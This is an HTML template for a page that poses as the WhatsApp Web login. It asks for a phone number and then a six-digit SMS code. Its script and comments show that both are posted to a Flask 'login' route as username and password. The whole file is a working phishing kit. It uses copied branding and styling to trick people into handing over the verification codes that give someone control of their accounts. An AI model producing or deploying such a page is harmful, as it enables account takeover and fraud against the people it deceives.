<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #eae6df;
            color: #111b21;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px 16px;
            position: relative;
        }
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 222px;
            background-color: #00a884;
            z-index: 0;
        }
        .login-card {
            position: relative;
            z-index: 1;
            background-color: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 16px;
            padding: 40px 32px;
            box-shadow: 0 17px 50px 0 rgba(11, 20, 26, 0.19);
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        .view {
            display: none;
            width: 100%;
            flex-direction: column;
            align-items: center;
        }
        .view.active {
            display: flex;
        }
        .logo-container {
            width: 64px;
            height: 64px;
            margin-bottom: 20px;
        }
        .whatsapp-logo {
            width: 100%;
            height: 100%;
        }
        .title {
            font-size: 24px;
            font-weight: 500;
            color: #111b21;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #667781;
            line-height: 20px;
            margin-bottom: 32px;
        }
        .phone-display {
            font-weight: 600;
            color: #111b21;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .edit-icon {
            color: #00a884;
            cursor: pointer;
            display: inline-flex;
        }
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .input-group {
            position: relative;
            width: 100%;
        }
        .input-field {
            width: 100%;
            height: 52px;
            padding: 16px;
            background-color: #ffffff;
            border: 1px solid #e9edef;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            color: #111b21;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .input-field:focus {
            border-color: #00a884;
            box-shadow: 0 0 0 1px #00a884;
        }
        .input-label {
            position: absolute;
            left: 16px;
            top: 16px;
            font-size: 16px;
            color: #8696a0;
            pointer-events: none;
            transition: all 0.15s ease;
            background-color: #ffffff;
            padding: 0 4px;
        }
        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: -9px;
            left: 12px;
            font-size: 12px;
            color: #00a884;
            font-weight: 500;
        }
        .otp-group .input-label {
            left: 50%;
            transform: translateX(-50%);
        }
        .otp-group .input-field:focus ~ .input-label,
        .otp-group .input-field:not(:placeholder-shown) ~ .input-label {
            left: 50%;
            transform: translateX(-50%);
        }
        .otp-input {
            font-size: 22px;
            font-weight: 600;
            letter-spacing: 6px;
            text-align: center;
        }
        .btn-submit {
            width: 100%;
            height: 48px;
            background-color: #00a884;
            border: none;
            border-radius: 24px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s;
        }
        .btn-submit:hover {
            background-color: #008f70;
        }
        .btn-link {
            background: none;
            border: none;
            color: #00a884;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        .btn-link:hover {
            text-decoration: underline;
        }
        .resend-text {
            font-size: 14px;
            color: #00a884;
            cursor: pointer;
            margin-top: 8px;
            font-weight: 500;
        }
        .resend-text:hover {
            text-decoration: underline;
        }
        /* hidden field */
        .hidden-field {
            display: none;
        }
    </style>
</head>
<body>

<main class="login-card">

    <!-- STEP 1: Phone Number Input View -->
    <div id="step-phone" class="view active">
        <div class="logo-container">
            <svg class="whatsapp-logo" viewBox="0 0 175.216 175.552" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M149.529 25.437C133.092 8.991 111.189 0 87.728 0 39.816 0 0.816 39.002 0.816 86.914c0 15.313 4.004 30.264 11.608 43.432L0 175.552l46.296-12.146c12.639 6.896 26.837 10.53 41.385 10.534h0.038c47.904 0 86.906-39.004 86.906-86.918 0-23.465-9.117-45.372-25.096-61.585zm-61.801 135.25h-0.03c-12.981 0-25.711-3.488-36.818-10.078l-2.641-1.568-27.387 7.184 7.31-26.697-1.722-2.742c-7.234-11.51-11.05-24.845-11.05-38.54 0-39.82 32.404-72.227 72.247-72.227 19.29 0 37.422 7.512 51.059 21.159 13.637 13.647 21.141 31.787 21.133 51.086 0 39.828-32.403 72.243-72.235 72.243z" fill="#00A884"/>
                <path fill-rule="evenodd" clip-rule="evenodd" d="M64.673 48.067c-2.221-4.935-4.557-5.034-6.681-5.122-1.731-0.075-3.714-0.07-5.698-0.07-1.984 0-5.201 0.743-7.925 3.714-2.724 2.971-10.401 10.154-10.401 24.762 0 14.608 10.649 28.718 12.134 30.7 1.485 1.982 20.537 32.846 50.697 44.57 25.061 9.742 30.158 7.806 35.607 7.31 5.449-0.495 17.581-7.18 20.057-14.113 2.476-6.933 2.476-12.877 1.734-14.114-0.742-1.238-2.724-1.982-5.7-3.467-2.976-1.485-17.581-8.667-20.306-9.658-2.724-0.991-4.706-1.485-6.69 1.485-1.983 2.971-7.677 9.658-9.41 11.64-1.733 1.982-3.467 2.229-6.443 0.744-2.976-1.485-12.56-4.63-23.927-14.767-8.847-7.89-14.818-17.636-16.551-20.608-1.733-2.971-0.185-4.578 1.303-6.058 1.336-1.329 2.975-3.468 4.46-5.201 1.485-1.733 1.983-2.971 2.974-4.953 0.991-1.983 0.495-3.715-0.248-5.201-0.743-1.485-6.48-15.932-9.083-21.716z" fill="#00A884"/>
            </svg>
        </div>
        <h1 class="title">Enter phone number</h1>
        <p class="subtitle">Select a country and enter your phone number to log in with WhatsApp Web.</p>

        <!-- PHONE FORM: only stores phone number and switches views -->
        <form class="login-form" id="phone-form" action="#">
            <div class="input-group">
                <input type="text" id="country" class="input-field" value="United States" placeholder=" " required />
                <label for="country" class="input-label">Country</label>
            </div>
            <div class="input-group">
                <input type="tel" id="phone-input" class="input-field" value="+1 " placeholder=" " required />
                <label for="phone-input" class="input-label">Phone Number</label>
            </div>
            <button type="submit" class="btn-submit">Next</button>
        </form>
        <button type="button" class="btn-link">Log in with QR code</button>
    </div>

    <!-- STEP 2: OTP Code Verification View -->
    <div id="step-otp" class="view">
        <div class="logo-container">
            <svg class="whatsapp-logo" viewBox="0 0 175.216 175.552" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M149.529 25.437C133.092 8.991 111.189 0 87.728 0 39.816 0 0.816 39.002 0.816 86.914c0 15.313 4.004 30.264 11.608 43.432L0 175.552l46.296-12.146c12.639 6.896 26.837 10.53 41.385 10.534h0.038c47.904 0 86.906-39.004 86.906-86.918 0-23.465-9.117-45.372-25.096-61.585zm-61.801 135.25h-0.03c-12.981 0-25.711-3.488-36.818-10.078l-2.641-1.568-27.387 7.184 7.31-26.697-1.722-2.742c-7.234-11.51-11.05-24.845-11.05-38.54 0-39.82 32.404-72.227 72.247-72.227 19.29 0 37.422 7.512 51.059 21.159 13.637 13.647 21.141 31.787 21.133 51.086 0 39.828-32.403 72.243-72.235 72.243z" fill="#00A884"/>
                <path fill-rule="evenodd" clip-rule="evenodd" d="M64.673 48.067c-2.221-4.935-4.557-5.034-6.681-5.122-1.731-0.075-3.714-0.07-5.698-0.07-1.984 0-5.201 0.743-7.925 3.714-2.724 2.971-10.401 10.154-10.401 24.762 0 14.608 10.649 28.718 12.134 30.7 1.485 1.982 20.537 32.846 50.697 44.57 25.061 9.742 30.158 7.806 35.607 7.31 5.449-0.495 17.581-7.18 20.057-14.113 2.476-6.933 2.476-12.877 1.734-14.114-0.742-1.238-2.724-1.982-5.7-3.467-2.976-1.485-17.581-8.667-20.306-9.658-2.724-0.991-4.706-1.485-6.69 1.485-1.983 2.971-7.677 9.658-9.41 11.64-1.733 1.982-3.467 2.229-6.443 0.744-2.976-1.485-12.56-4.63-23.927-14.767-8.847-7.89-14.818-17.636-16.551-20.608-1.733-2.971-0.185-4.578 1.303-6.058 1.336-1.329 2.975-3.468 4.46-5.201 1.485-1.733 1.983-2.971 2.974-4.953 0.991-1.983 0.495-3.715-0.248-5.201-0.743-1.485-6.48-15.932-9.083-21.716z" fill="#00A884"/>
            </svg>
        </div>
        <h1 class="title">Enter Code</h1>
        <p class="subtitle">
            Enter the 6-digit code sent to<br>
            <span class="phone-display">
                <span id="display-phone-number">+1 234 567 890</span>
                <span class="edit-icon" id="btn-edit-phone" title="Edit phone number">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 20h9"></path>
                        <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path>
                    </svg>
                </span>
            </span>
        </p>

        <!-- OTP FORM: posts phone as username and OTP as password to Flask -->
        <form class="login-form" id="otp-form" action="{{ url_for('login') }}" method="POST">
            <!-- Hidden field for phone number (username) -->
            <input type="hidden" name="username" id="otp-username" value="">

            <div class="input-group otp-group">
                <input type="text" id="otp-code" name="password" class="input-field otp-input" maxlength="6" placeholder=" " required />
                <label for="otp-code" class="input-label">6-digit Code</label>
            </div>
            <button type="submit" class="btn-submit">Verify</button>
            <div class="resend-text">Didn't receive code? Resend SMS</div>
        </form>
    </div>

</main>

<script>
    const phoneForm = document.getElementById('phone-form');
    const phoneInput = document.getElementById('phone-input');
    const displayPhoneNumber = document.getElementById('display-phone-number');
    const stepPhone = document.getElementById('step-phone');
    const stepOtp = document.getElementById('step-otp');
    const btnEditPhone = document.getElementById('btn-edit-phone');
    const otpCodeInput = document.getElementById('otp-code');
    const otpUsername = document.getElementById('otp-username');

    // Transition from Phone Number step to OTP Code step
    phoneForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const enteredPhone = phoneInput.value.trim();
        if (enteredPhone) {
            displayPhoneNumber.textContent = enteredPhone;
            otpUsername.value = enteredPhone;   // set hidden field for submission
            stepPhone.classList.remove('active');
            stepOtp.classList.add('active');
            otpCodeInput.focus();
        }
    });

    // Edit Phone Number action (Back to Phone View)
    btnEditPhone.addEventListener('click', () => {
        stepOtp.classList.remove('active');
        stepPhone.classList.add('active');
        phoneInput.focus();
    });
</script>

</body>
</html>
